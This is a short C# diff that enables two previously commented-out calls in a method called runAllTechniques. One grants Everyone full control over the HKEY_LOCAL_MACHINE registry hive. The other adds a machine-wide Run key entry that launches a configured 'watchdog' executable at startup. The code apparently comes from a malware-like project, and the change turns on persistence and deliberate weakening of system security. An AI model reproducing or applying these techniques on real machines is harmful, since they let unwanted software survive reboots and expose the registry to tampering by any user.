@@ -12,9 +12,9 @@ using System.IO;
 
         public static void runAllTechniques()
         {
-            //GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
+            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
    
-            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
           
 
 
